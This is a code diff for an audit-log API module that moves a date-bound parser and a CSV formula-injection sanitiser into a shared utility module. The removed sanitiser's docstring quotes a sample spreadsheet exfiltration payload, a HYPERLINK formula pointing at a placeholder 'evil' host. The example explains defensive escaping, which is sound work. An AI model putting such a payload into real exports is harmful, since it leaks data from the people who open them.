@@ -15,7 +15,6 @@ import csv
 import datetime as dt
 import io
 import json
-import re
 from collections.abc import AsyncIterator
 from typing import Annotated, Literal
 
@@ -26,6 +25,12 @@ from sqlalchemy.exc import SQLAlchemyError
 
 from oc8 import models as m
 from oc8.api.deps import CurrentPrincipal, DbSession, require_permission
+from oc8.api.v1._export_utils import (
+    csv_safe as _csv_safe,  # shared with usage export; kept aliased to minimise this module's diff
+)
+from oc8.api.v1._export_utils import (
+    parse_date_bound as _parse_bound,
+)
 from oc8.audit.integrity import (
     BATCH as BATCH,  # re-exported: tests monkeypatch this name
 )
@@ -45,47 +50,6 @@ _require_read = require_permission(perm(AUDIT, VIEW))
 _require_verify = require_permission(AUDIT_VERIFY)
 
 MAX_LIMIT = 200
-
-_DATE_ONLY = re.compile(r"^\d{4}-\d{2}-\d{2}$")
-
-
-def _parse_bound(raw: str | None, *, field: str, end_of_day: bool) -> dt.datetime | None:
-    """Parse a `from`/`to` range bound.
-
-    Two things this fixes over letting FastAPI coerce straight to datetime:
-
-    1. A date-only `to`. The operator screen sends an <input type="date"> value,
-       so "2026-07-21" parsed to 2026-07-21T00:00:00 and the `ts <= to` bound
-       silently dropped everything that happened on the selected day --
-       invisibly, and identically in the export, so exported evidence came up
-       short by up to a day. A date-only `to` now covers through end-of-day; a
-       `to` that carries an explicit time still means exactly what it says.
-    2. Naive values. audit_event.ts is timestamptz, and a naive bound was
-       resolved against the *server process's* local timezone, so the same
-       query returned different rows depending on where the API happened to
-       run. Naive input is anchored to UTC, which is what the log is stored and
-       rendered in. An explicit offset is honoured as given.
-
-    Both GET /audit and GET /audit/export parse through this one function; they
-    must never disagree about what a range covers.
-    """
-    if raw is None:
-        return None
-    s = raw.strip()
-    if not s:
-        return None
-    try:
-        if _DATE_ONLY.match(s):
-            day = dt.date.fromisoformat(s)
-            parsed = dt.datetime.combine(day, dt.time.max if end_of_day else dt.time.min)
-        else:
-            parsed = dt.datetime.fromisoformat(s)
-    except ValueError as exc:
-        raise HTTPException(
-            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
-            detail=f"invalid '{field}' timestamp",
-        ) from exc
-    return parsed if parsed.tzinfo is not None else parsed.replace(tzinfo=dt.UTC)
 
 
 def _event_to_dto(ev: m.AuditEvent) -> AuditEventDTO:
@@ -189,26 +153,6 @@ _EXPORT_COLUMNS = [
     "hash",
     "prevHash",
 ]
-
-
-_CSV_FORMULA_LEADS = ("=", "+", "-", "@")
-
-
-def _csv_safe(value: str) -> str:
-    """Neutralise spreadsheet formula injection in a CSV cell.
-
-    `reason` is free operator text written straight into the export, so a value
-    starting with = + - @ is evaluated when the auditor opens the file in Excel
-    or Sheets -- the standard exfiltration vector, e.g.
-    =HYPERLINK("http://evil/"&A1,"ok").
-
-    Escape chosen: a single-quote PREFIX. Excel and Sheets both treat a leading
-    apostrophe as "the rest is literal text", and it survives a round-trip
-    through a CSV parser as a visible, obviously-added character rather than
-    silently altering the value. CSV only -- JSONL is not spreadsheet-
-    interpreted and must stay a byte-faithful copy of the log.
-    """
-    return "'" + value if value.startswith(_CSV_FORMULA_LEADS) else value
 
 
 def _row(dto: AuditEventDTO) -> list[str]:
